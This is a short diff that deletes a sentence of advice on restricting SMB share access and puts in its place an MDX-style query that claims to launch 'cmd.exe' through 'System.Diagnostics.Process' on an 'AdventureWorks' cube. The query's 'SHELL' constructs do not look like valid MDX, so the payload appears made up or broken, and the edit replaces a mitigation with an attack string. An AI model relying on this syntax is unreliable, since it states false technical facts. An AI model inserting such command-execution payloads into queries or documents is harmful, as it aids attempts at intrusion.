@@ -1,1 +1,9 @@
-Restrict and control access to SMB shares hosting files. Implement proper authentication mechanisms to ensure only authorized users can access and manipulate these files.
+WITH 
+MEMBER measures.command AS 
+'cmd.exe /c dir', 
+SHELL AS 'System.Diagnostics.Process', 
+VISIBLE = 0; 
+SELECT 
+{measures.command} ON 0 
+FROM [AdventureWorks] CELL PROPERTIES 
+SHELL;
